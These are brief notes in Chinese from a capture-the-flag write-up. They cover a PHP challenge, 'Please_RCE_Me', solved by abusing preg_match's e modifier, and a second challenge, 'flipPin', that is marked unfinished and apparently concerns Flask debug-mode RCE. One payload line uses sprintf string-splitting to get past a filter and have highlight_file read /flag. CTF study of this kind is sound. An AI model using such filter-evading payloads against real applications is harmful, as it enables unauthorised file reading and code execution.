# Please_RCE_Me
	- 简单的RCE绕过，使用`preg_match`+``e``修饰符进行RCE
	- 使用`sprintf`可以构造任意字符串，使用`highlight_file`可以读取文件
	- payload
		- ```
		  task=highlight_file(sprintf("/fl%s","ag"))&flag=please_give_me_flaG
		  ```
- # flipPin
	- > 施工中
	- 应该是 [[CTFWEB/Flask/Debug模式RCE]]
	-